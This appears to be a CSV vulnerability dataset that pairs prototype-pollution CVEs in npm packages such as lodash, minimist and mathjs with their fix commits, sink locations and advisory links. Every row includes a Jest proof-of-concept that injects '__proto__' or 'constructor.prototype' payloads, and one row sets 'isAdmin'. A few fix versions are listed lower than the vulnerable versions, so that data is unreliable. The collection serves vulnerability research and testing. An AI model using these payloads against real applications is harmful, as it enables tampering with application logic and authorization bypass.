Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,CVE-2021-4278,tree-kit,0.6.1,0.7.0,prototype-pollution/tree-kit_0.6.1,"test(""prototype pollution in tree-kit"", () => {
  const { dotPath } = require('tree-kit')
  obj = {};
  expect({}.polluted).toBe(undefined);
  dotPath.set({}, [""__proto__"", ""polluted""], ""yes"") 
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/cronvel/tree-kit/commit/c90d45f4f0e1266867be136670eddeb99b2a32a5,,https://security.snyk.io/vuln/SNYK-JS-TREEKIT-1077068; 
prototype-pollution,CVE-2020-7641,grunt-util-property,0.0.2,,prototype-pollution/grunt-util-property_0.0.2,"//https://snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088
test(""prototype pollution in grunt-util-property"", () => {
  const grunt = require(""grunt"");
  const a = require(""grunt-util-property"");

  expect({}.polluted).toBe(undefined);

  let b = a(grunt);
  b.call({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,main.js:41:21,https://security.snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088; 
prototype-pollution,CVE-2020-7617,ini-parser,0.0.2,,prototype-pollution/ini-parser_0.0.2,"// https://snyk.io/vuln/SNYK-JS-INIPARSER-564122
test(""prototype pollution in ini-parser"", () => {
  expect({}.polluted).toBe(undefined);

  let a = require(""ini-parser"");
  a.parse(""[__proto__]\npolluted=yes"");

  expect({}.polluted).toBe(""yes"");
});
",,index.js:14:20,https://security.snyk.io/vuln/SNYK-JS-INIPARSER-564122; https://github.com/advisories/GHSA-96r7-mrqf-jhcc
prototype-pollution,CVE-2020-28274,deepref,1.1.1,1.2.1,prototype-pollution/deepref_1.1.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28274
test(""prototype pollution in deepref"", () => {
  expect({}.polluted).toBe(undefined);

  const deepref = require(""deepref"");
  deepref.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/isaymatato/deepref/commit/24935e6a1060cb09c641d3075982f0b44cfca4c2,index.js:29:28,https://security.snyk.io/vuln/SNYK-JS-DEEPREF-1049536; https://github.com/advisories/GHSA-7c7g-72q7-4xhm
prototype-pollution,CVE-2020-8203,lodash,4.17.11,4.17.16,prototype-pollution/lodash_4.17.11,"// https://hackerone.com/reports/712065
test(""prototype pollution in lodash"", () => {
  expect({}.polluted).toBe(undefined);

  const _ = require(""lodash"");
  _.zipObjectDeep([""__proto__.polluted""], [""yes""]);

  expect({}.polluted).toBe(""yes"");
});
",,lodash.js:2559:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-608086; https://github.com//advisories/GHSA-p6mc-m468-83gw
prototype-pollution,CVE-2020-7714,confucious,0.0.12,,prototype-pollution/confucious_0.0.12,"//https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
test(""prototype pollution in confucious"", () => {
  expect({}.polluted).toBe(undefined);

  const confucious = require(""confucious"");
  confucious.set(""__proto__:polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,confucious.js:48:21,https://security.snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665; https://github.com/advisories/GHSA-fmrr-mx6j-h3h5
prototype-pollution,CVE-2020-7707,property-expr,2.0.2,2.0.3,prototype-pollution/property-expr_2.0.2,"//https://hackerone.com/reports/910206
test(""prototype pollution in property-expr"", () => {
  let expr = require(""property-expr"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  expr.setter(""constructor.prototype.polluted"")(obj, ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jquense/expr/commit/df846910915d59f711ce63c1f817815bceab5ff7,index.js:55:28,https://security.snyk.io/vuln/SNYK-JS-PROPERTYEXPR-598800; https://github.com/advisories/GHSA-6fw4-hr69-g3rv
prototype-pollution,,rfc6902,4.0.2,5.0.0,prototype-pollution/rfc6902_4.0.2,"//https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318
test(""prototype pollution in rfc6902"", () => {
  expect({}.polluted).toBe(undefined);
  var rfc6902 = require(""rfc6902"");
  var obj = {};
  rfc6902.applyPatch(obj, [
    { op: ""add"", path: ""/__proto__/polluted"", value: ""yes"" },
  ]);
  expect({}.polluted).toBe(""yes"");
});
",,patch.js:57:21,https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318; 
prototype-pollution,CVE-2020-28462,ion-parser,0.5.2,,prototype-pollution/ion-parser_0.5.2,"//https://snyk.io/vuln/SNYK-JS-IONPARSER-1048971
test(""prototype pollution in ion-parser"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ION = require(""ion-parser"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  ION.parse(
    fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8"")
  );
  expect({}.polluted).toBe(""yes"");
});
",,parser.js:359:13,https://security.snyk.io/vuln/SNYK-JS-IONPARSER-1048971; 
prototype-pollution,,keyd,1.3.4,1.4.3,prototype-pollution/keyd_1.3.4,"//https://hackerone.com/reports/877515
test(""prototype pollution in keyd"", () => {
  expect({}.polluted).toBe(undefined);

  const keyd = require(""keyd"");
  keyd({}).set(""__proto__.polluted"", ""yes""); //payload

  expect({}.polluted).toBe(""yes"");
});
",,index.js:76:60,https://security.snyk.io/vuln/SNYK-JS-KEYD-674472; 
prototype-pollution,,objutil,2.17.3,,prototype-pollution/objutil_2.17.3,"//https://snyk.io/vuln/SNYK-JS-OBJUTIL-559496

test(""prototype pollution in objutil"", () => {
  const { merge, remove } = require(""objutil"");

  let a = { x: 1, y: { w: 1, z: 2 } };
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  result = merge(a, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,dist/objutil.cjs.js:192:59,https://security.snyk.io/vuln/SNYK-JS-OBJUTIL-559496; 
prototype-pollution,,prototyped.js,2.0.0,2.0.1,prototype-pollution/prototyped.js_2.0.0,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test(""prototype pollution in merge-recursive"", () => {
  // const merge = require(""merge-recursive"").recursive;
  // const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  // obj = {};

  // expect({}.polluted).toBe(undefined);

  // merge({}, JSON.parse(malicious_payload));

  // expect({}.polluted).toBe(""yes"");

  const set = require(""prototyped.js/dist/object/set"").default;
  console.log(""Prototype before set"", {}.polluted);
  set({}, ""__proto__.isAdmin"", true);
  console.log(""Prototype after set"", {}.polluted);
});
",https://github.com/ardalanamini/prototyped.js/commit/3ab56e78250d3d5b44ac03938d3d04591b206730,lib/index.js:66:14,https://security.snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824; 
prototype-pollution,,objtools,3.0.0,,prototype-pollution/objtools_3.0.0,"//https://hackerone.com/reports/878394

test(""prototype pollution in objtools"", () => {
  const objtools = require(""objtools"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}'); //payload
  obj = {};

  expect({}.polluted).toBe(undefined);

  objtools.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:440:18,https://security.snyk.io/vuln/SNYK-JS-OBJTOOLS-674471; 
prototype-pollution,CVE-2020-7742,simpl-schema,1.10.0,1.10.2,prototype-pollution/simpl-schema_1.10.0,"//https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
test(""prototype pollution in simpl-schema"", () => {
  const SimpleSchema = require(""simpl-schema"").default;
  let obj = {};

  expect({}.polluted).toBe(undefined);

  SimpleSchema.setDefaultMessages(
    JSON.parse('{""__proto__"":{""polluted"":""yes""}}')
  );
  expect({}.polluted).toBe(""yes"");
});
",,dist/utility/merge.js:31:27,https://security.snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157; https://github.com/advisories/GHSA-9mx2-prfp-8hqp
prototype-pollution,CVE-2018-3751,merge-recursive,0.0.3,,prototype-pollution/merge-recursive_0.0.3,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test(""prototype pollution in merge-recursive"", () => {
  const merge = require(""merge-recursive"").recursive;
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:66:14,https://security.snyk.io/vuln/npm:merge-recursive:20180415; https://github.com/advisories/GHSA-cvxm-f295-x957
prototype-pollution,CVE-2021-25949,set-getter,0.1.0,0.1.1,prototype-pollution/set-getter_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949
test(""prototype pollution in set-getter "", () => {
  var setGetter = require(""set-getter"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setGetter(obj, ""__proto__.polluted"", function (polluted) {
    return ""yes"";
  });
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/doowb/set-getter/commit/66eb3f0d4686a4a8c7c3d6f7ecd8e570b580edc4,,https://security.snyk.io/vuln/SNYK-JS-SETGETTER-1303099; https://github.com/advisories/GHSA-jv35-xqg7-f92r
prototype-pollution,CVE-2020-7743,mathjs,7.4.0,7.5.1,prototype-pollution/mathjs_7.4.0,"//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7743
test(""prototype pollution in mathjs "", () => {
  var mathMod = require(""mathjs"");
  const mathjs = mathMod.create(mathMod.all);

  expect({}.polluted).toBe(undefined);

  const newConfig = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  mathjs.config(newConfig);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/josdejong/mathjs/commit/ecb80514e80bce4e6ec7e71db8ff79954f07c57e,lib/utils/object.js:131:17,https://security.snyk.io/vuln/SNYK-JS-MATHJS-1016401; https://github.com/advisories/GHSA-x2fc-mxcx-w4mf
prototype-pollution,CVE-2020-7643,paypal-adaptive,0.4.1,,prototype-pollution/paypal-adaptive_0.4.1,"//https://snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089

test(""prototype pollution in paypal-adaptive"", () => {
  expect({}.polluted).toBe(undefined);

  const PayPal = require(""paypal-adaptive"");
  const p = new PayPal(
    JSON.parse(
      '{""__proto__"": {""polluted"": ""yes""}, ""userId"": ""foo"", ""password"": ""bar"", ""signature"": ""abcd"", ""appId"": ""1234"", ""sandbox"": ""1234""}'
    )
  );

  expect({}.polluted).toBe(""yes"");
});
",,lib/paypal-adaptive.js:31:22,https://security.snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089; https://github.com/advisories/GHSA-v3r2-3fp4-rp46
prototype-pollution,,nestie,1.0.0,1.0.2,prototype-pollution/nestie_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25947
test(""prototype pollution in nestie"", () => {
  const { nestie } = require(""nestie"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  nestie({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lukeed/nestie/commit/c571c77928ecd7f256a935c7c3860f33dac4653f,dist/index.js:29:14,https://security.snyk.io/vuln/SNYK-JS-NESTIE-1300518; https://github.com/advisories/GHSA-m7rg-8wvq-846v
prototype-pollution,CVE-2018-16492,extend,3.0.1,1.0.1,prototype-pollution/extend_3.0.1,"//https://hackerone.com/reports/381185
test(""prototype pollution in extend "", () => {
  let extend = require(""extend"");
  let payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  var obj = {};

  expect({}.polluted).toBe(undefined);

  extend(true, {}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/justmoon/node-extend/commit/0e68e71d93507fcc391e398bc84abd0666b28190,index.js:77:20,https://security.snyk.io/vuln/npm:extend:20180424; https://github.com/advisories/GHSA-qrmc-fj45-qfc2
prototype-pollution,CVE-2021-25913,set-or-get,1.2.10,1.2.11,prototype-pollution/set-or-get_1.2.10,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913

test(""prototype pollution in set-or-get"", () => {
  var SetOrGet = require(""set-or-get"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  SetOrGet(obj, ""__proto__"", {}).polluted = ""yes"";
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/IonicaBizau/set-or-get.js/commit/82ede5cccb2e8d13e4f62599203a4389f6d8e936,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-SETORGET-1070806; https://github.com/advisories/GHSA-6rv4-4qv6-88g2
prototype-pollution,CVE-2020-7736,bmoor,0.8.11,0.8.12,prototype-pollution/bmoor_0.8.11,"//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
test(""prototype pollution in bmoor"", () => {
  expect({}.polluted).toBe(undefined);

  const bmoor = require(""bmoor"");
  bmoor.set({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,src/core.js:194:18,https://security.snyk.io/vuln/SNYK-JS-BMOOR-598664; https://github.com/advisories/GHSA-h3rx-g5c9-8q4x
prototype-pollution,CVE-2021-23700,merge-deep2,3.0.5,,prototype-pollution/merge-deep2_3.0.5,"//https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593
test(""prototype pollution in merge-deep2"", () => {
  const mergeDeep2 = require(""merge-deep2"");
  let obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  mergeDeep2({}, JSON.parse(malicious_payload), true);
  expect({}.polluted).toBe(""yes"");
});
",,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593; https://github.com/advisories/GHSA-j28q-p8ww-cp87
prototype-pollution,CVE-2021-23432,mootools,1.5.2,,prototype-pollution/mootools_1.5.2,"//https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536
test(""prototype pollution in mootools"", () => {
  require(""mootools"");

  expect({}.polluted).toBe(undefined);

  Object.merge({}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",,lib/mootools-core-1.5.2-server.js:355:24,https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536; https://github.com/advisories/GHSA-x6hx-7gh3-3q98
prototype-pollution,CVE-2020-28279,flattenizer,0.0.5,1.1.1,prototype-pollution/flattenizer_0.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
test(""prototype pollution in flattenizer"", () => {
  expect({}.polluted).toBe(undefined);

  const flattenizer = require(""flattenizer"");
  flattenizer.unflatten({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",,lib/flattenizer.min.js:1:1550,https://security.snyk.io/vuln/SNYK-JS-FLATTENIZER-1054934; 
prototype-pollution,CVE-2020-7772,doc-path,2.0.0,2.3.0,prototype-pollution/doc-path_2.0.0,"//https://snyk.io/vuln/SNYK-JS-DOCPATH-1011952
test(""prototype pollution in doc-path"", () => {
  const path = require(""doc-path"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  path.setPath({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/mrodrig/doc-path/commit/3e2bb168cf303bffcd7fae5f8d05e5300c1541c7,src/path.js:54:27,https://security.snyk.io/vuln/SNYK-JS-DOCPATH-1011952; https://github.com/advisories/GHSA-gm8g-xhh8-rmwr
prototype-pollution,CVE-2018-16487,lodash,4.17.9,4.17.11,prototype-pollution/lodash_4.17.9,"//https://hackerone.com/reports/380873
test(""prototype pollution in lodash"", () => {
  const _ = require(""lodash"");
  let payload = JSON.parse(
    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
  );
  expect({}.polluted).toBe(undefined);
  _.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,lodash.js:2573:21,https://hackerone.com/reports/380873; https://security.snyk.io/vuln/SNYK-JS-LODASH-73638; https://github.com/advisories/GHSA-h726-x36v-rx45
prototype-pollution,CVE-2020-28273,set-in,1.0.0,2.0.1,prototype-pollution/set-in_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28273
test(""prototype pollution in set-in"", () => {
  const si = require(""set-in"");
  const obj = {};

  expect({}.polluted).toBe(undefined);

  si(obj, [""__proto__"", ""polluted""], ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/ahdinosaur/set-in/commit/e431effa00195a6f06b111e09733cd1445a91a88,index.js:41:17,https://security.snyk.io/vuln/SNYK-JS-SETIN-1048049; https://github.com/advisories/GHSA-qr4p-c9wr-phr6
prototype-pollution,,nested-property,0.0.5,3.0.0,prototype-pollution/nested-property_0.0.5,"//https://snyk.io/test/npm/nested-property/0.0.5

test(""prototype pollution in nested-property"", () => {
  const nestedProperty = require(""nested-property"");
  const object1 = {};
  expect({}.polluted).toBe(undefined);
  nestedProperty.set(object1, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/cosmosio/nested-property/commit/881cf37eb956641fc26011ff66a436eb603c89d1,index.js:95:27,https://security.snyk.io/vuln/SNYK-JS-NESTEDPROPERTY-1022154; 
prototype-pollution,CVE-2018-16486,defaults-deep,0.2.4,,prototype-pollution/defaults-deep_0.2.4,"//https://hackerone.com/reports/380878
test(""prototype pollution in defaults-deep "", () => {
  const defaultsDeep = require(""defaults-deep"");

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let payload = JSON.parse(
    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
  );
  defaultsDeep({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",,index.js:26:21,https://security.snyk.io/vuln/SNYK-JS-DEFAULTSDEEP-173661; https://github.com/advisories/GHSA-pjxw-22xf-6pwc
prototype-pollution,CVE-2020-7719,locutus,2.0.11,2.0.12,prototype-pollution/locutus_2.0.11,"//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
test(""prototype pollution in locutus"", () => {
  try {
    polluted;
    expect(true).toBe(false);
  } catch (e) {
    expect(true).toBe(true);
  }

  const locutus = require(""locutus"");
  locutus.php.strings.parse_str(""__proto__[polluted]=yes"");

  expect(polluted).toBe(""yes"");
});
",,,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-598675; https://github.com/advisories/GHSA-f98m-q3hr-p5wq
prototype-pollution,CVE-2021-23452,x-assign,0.1.4,,prototype-pollution/x-assign_0.1.4,"//https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314
test(""prototype pollution in x-assign"", () => {
  const XAssign = require(""x-assign"");

  expect({}.polluted).toBe(undefined);

  const a = { red: ""apple"" };
  const b = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
  const c = XAssign.assign(a, b);

  expect({}.polluted).toBe(""yes"");
});
",,index.js:34:20,https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314; https://github.com/advisories/GHSA-4mvj-rq4v-2fxw
prototype-pollution,CVE-2018-3753,merge-objects,1.0.3,,prototype-pollution/merge-objects_1.0.3,"//https://snyk.io/vuln/npm:merge-objects:20180415
test(""prototype pollution in merge-objects"", () => {
  const merge = require(""merge-objects"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",,merge-objects.js:20:20,https://security.snyk.io/vuln/npm:merge-objects:20180415; https://github.com/advisories/GHSA-fp82-2h99-3fpp
prototype-pollution,CVE-2020-7771,asciitable.js,1.0.2,1.0.3,prototype-pollution/asciitable.js_1.0.2,"//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
test(""Prototype pollution in asciitable.js"", () => {
  expect({}.polluted).toBe(undefined);

  const req = require(""asciitable.js"");
  const b = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  req({}, b);

  expect({}.polluted).toBe(""yes"");
});
",,asciitable.umd.js:50:104,https://security.snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799; https://github.com/advisories/GHSA-5pxj-mhwj-x5gv
prototype-pollution,CVE-2020-28499,merge,2.1.0,,prototype-pollution/merge_2.1.0,"//https://snyk.io/vuln/SNYK-JS-MERGE-1042987

test(""prototype pollution in merge"", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""merge"");
  const payload2 = JSON.parse('{""x"": {""__proto__"":{""polluted"":""yes""}}}');
  let obj1 = { x: { y: 1 } };
  merge.recursive(obj1, payload2);

  expect({}.polluted).toBe(""yes"");
});
",,lib/src/index.js:59:19,https://security.snyk.io/vuln/SNYK-JS-MERGE-1042987; https://github.com/advisories/GHSA-7wpw-2hjm-89gp
prototype-pollution,,objnest,5.0.0,5.1.0,prototype-pollution/objnest_5.0.0,"//https://github.com/okunishinishi/node-objnest/pull/6
test(""prototype pollution in objnest"", () => {
  const objnest = require(""objnest"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  objnest.expand({ ""__proto__.polluted"": ""yes"" });
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/okunishinishi/node-objnest/commit/c541e1a775b562d63402a14dac9f8cbc52b116d7,lib/objnest.js:44:35,https://security.snyk.io/vuln/SNYK-JS-OBJNEST-1041787; 
prototype-pollution,CVE-2021-25927,flat,5.0.0,2.0.2,prototype-pollution/flat_5.0.0,"//https://snyk.io/vuln/SNYK-JS-FLAT-596927
test(""prototype pollution in flat"", () => {
  var unflatten = require(""flat"").unflatten;

  expect({}.polluted).toBe(undefined);

  unflatten({
    ""__proto__.polluted"": ""yes"",
  });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,index.js:145:21,https://security.snyk.io/vuln/SNYK-JS-FLAT-596927; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
prototype-pollution,CVE-2021-25928,safe-obj,1.0.0,,prototype-pollution/safe-obj_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928

test(""prototype pollution in safeObj"", () => {
  var safeObj = require(""safe-obj"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safeObj.expand(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:122:28,https://security.snyk.io/vuln/SNYK-JS-SAFEOBJ-1277111; https://github.com/advisories/GHSA-wpgh-hmv4-r3v5
prototype-pollution,CVE-2020-7751,pathval,1.1.0,1.1.1,prototype-pollution/pathval_1.1.0,"//https://snyk.io/vuln/SNYK-JS-PATHVAL-596926
test(""prototype pollution in pathval"", () => {
  var pathval = require(""pathval"");

  var obj = {};
  expect({}.polluted).toBe(undefined);

  pathval.setPathValue(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/chaijs/pathval/commit/7859e0e1ce4c2c67de897edce097ed31f80661d0,index.js:158:25,https://security.snyk.io/vuln/SNYK-JS-PATHVAL-596926; 
prototype-pollution,CVE-2021-23444,jointjs,3.4.0,3.4.2,prototype-pollution/jointjs_3.4.0,"//https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578
test(""prototype pollution in jointjs"", () => {
  expect({}.polluted).toBe(undefined);

  const jointjs = require(""jointjs"");
  jointjs.util.setByPath({}, [[""__proto__""], ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});

// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
",https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,dist/joint.min.js:8:103865,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578; https://github.com/advisories/GHSA-f3pp-32qc-36w4
prototype-pollution,CVE-2020-7765,@firebase/util,0.3.3,0.3.4,prototype-pollution/firebase-util_0.3.3-canary.c47ba31d0,"//https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324
test(""prototype pollution in @firebase/util"", () => {
  expect({}.polluted).toBe(undefined);

  const util = require(""@firebase/util"");
  var payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  const a = {
    nest: {
      number: 1,
      string: ""1"",
      object: { key: ""1"" },
      date: new Date(1),
      nest: {
        a: 1,
      },
    },
  };

  var result = util.deepExtend(a, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/firebase/firebase-js-sdk/commit/9cf727fcc3d049551b16ae0698ac33dc2fe45ada,util/src/deepCopy.ts:68:49,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324; https://github.com/advisories/GHSA-fpm5-vv97-jfwg
prototype-pollution,CVE-2020-7598,minimist,1.0.0,0.2.1,prototype-pollution/minimist_1.0.0,"//https://snyk.io/vuln/SNYK-JS-MINIMIST-559764
test(""prototype pollution in minimist"", () => {
  expect({}.polluted).toBe(undefined);

  require(""minimist"")(""--__proto__.polluted yes"".split("" ""));

  expect({}.polluted).toBe(""yes"");
});
",,index.js:189:16,https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764; https://github.com/advisories/GHSA-vh95-rmgr-6w4m
prototype-pollution,CVE-2021-25945,js-extend,0.0.1,,prototype-pollution/js-extend_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25945
test(""prototype pollution in js-extend"", () => {
  expect({}.polluted).toBe(undefined);

  const jsExtend = require(""js-extend"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  jsExtend.extend({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,extend.js:17:23,https://security.snyk.io/vuln/SNYK-JS-JSEXTEND-1297101; https://github.com/advisories/GHSA-mh82-55cm-6gfh
prototype-pollution,CVE-2018-16472,cached-path-relative,1.0.1,1.0.2,prototype-pollution/cached-path-relative_1.0.1,"//https://hackerone.com/reports/390847
test(""prototype pollution in cached-path-relative"", () => {
  expect({}.polluted).toBe(undefined);

  var relative = require(""cached-path-relative"");
  relative(""__proto__"", ""polluted"");

  expect({}.polluted).not.toBe(undefined);
});
",https://github.com/ashaffer/cached-path-relative/commit/a43cffec84ed0e9eceecb43b534b6937a8028fc0,lib/index.js:39:19,https://security.snyk.io/vuln/SNYK-JS-CACHEDPATHRELATIVE-72573; https://github.com/advisories/GHSA-hc9w-4p87-j549
prototype-pollution,,ts-dot-prop,1.4.0,1.4.1,prototype-pollution/ts-dot-prop_1.4.0,"//https://hackerone.com/reports/980599
test(""prototype pollution in ts-dot-prop"", () => {
  const tsDot = require(""ts-dot-prop"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  tsDot.set(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/justinlettau/ts-dot-prop/commit/816b887a669ab959c3c2f85c6563d33928f00f14#diff-f41e9d04a45c83f3b6f6e630f10117feR183,src/index.ts:72:21,https://security.snyk.io/vuln/SNYK-JS-TSDOTPROP-1024441; 
prototype-pollution,,@lyngs/merge,1.0.9,,prototype-pollution/lyngs-merge_1.0.9,"//https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823
test(""prototype pollution in @lyngs/merge"", () => {
  const { merge } = require(""@lyngs/merge"");
  expect({}.polluted).toBe(undefined);
  merge({ dummy: 1 }, JSON.parse(`{""__proto__"":{""polluted"":""yes""}}`));
  expect({}.polluted).toBe(""yes"");
});
",,merge/dist/index.js:2684:20,https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823; 
